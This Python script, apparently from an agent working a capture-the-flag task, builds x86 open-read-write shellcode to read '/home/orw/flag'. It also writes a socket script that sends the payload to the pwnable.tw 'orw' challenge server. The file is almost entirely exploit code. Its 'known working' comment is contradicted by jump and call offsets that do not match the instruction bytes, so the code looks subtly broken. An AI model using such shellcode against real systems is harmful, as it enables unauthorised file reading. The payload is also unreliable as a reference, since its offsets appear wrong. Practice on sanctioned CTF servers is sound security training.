#!/usr/bin/env python3

# Direct hex approach - try sending shellcode as hex directly

def create_direct_shellcode():
    # Try the most basic ORW shellcode pattern
    # This is a known working pattern for ORW challenges
    shellcode = b""
    
    # jmp-call-pop technique
    shellcode += b"\xeb\x36"              # jmp 0x38
    shellcode += b"\x5e"                  # pop esi
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x88\x46\x0e"          # mov [esi+14], al
    shellcode += b"\x89\xf3"              # mov ebx, esi
    shellcode += b"\x31\xc9"              # xor ecx, ecx
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb0\x05"              # mov al, 5
    shellcode += b"\xcd\x80"              # int 0x80
    shellcode += b"\x89\xc3"              # mov ebx, eax
    shellcode += b"\x89\xf1"              # mov ecx, esi
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb2\x64"              # mov dl, 100
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x03"              # mov al, 3
    shellcode += b"\xcd\x80"              # int 0x80
    shellcode += b"\x89\xc2"              # mov edx, eax
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x04"              # mov al, 4
    shellcode += b"\xb3\x01"              # mov bl, 1
    shellcode += b"\xcd\x80"              # int 0x80
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x40"                  # inc eax
    shellcode += b"\xcd\x80"              # int 0x80
    shellcode += b"\xe8\xc5\xff\xff\xff"  # call $-0x3b
    shellcode += b"/home/orw/flag"        # string
    
    return shellcode

def main():
    shellcode = create_direct_shellcode()
    print(f"Direct shellcode: {len(shellcode)} bytes")
    print(f"Hex: {shellcode.hex()}")
    
    # Write raw bytes
    with open('/workspace/orw_challenge/direct.bin', 'wb') as f:
        f.write(shellcode)
    
    # Also create a hex string for direct use
    hex_str = shellcode.hex()
    print(f"\nHex string: {hex_str}")
    
    # Create a simple script to test
    with open('/workspace/orw_challenge/test_direct.py', 'w') as f:
        f.write(f'''#!/usr/bin/env python3
import socket

shellcode = bytes.fromhex("{hex_str}")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("chall.pwnable.tw", 10001))

data = s.recv(1024)
print(data.decode())

s.send(shellcode)

response = s.recv(1024)
print(response.decode())

s.close()
''')
    
    print("Direct test script created")

if __name__ == "__main__":
    main()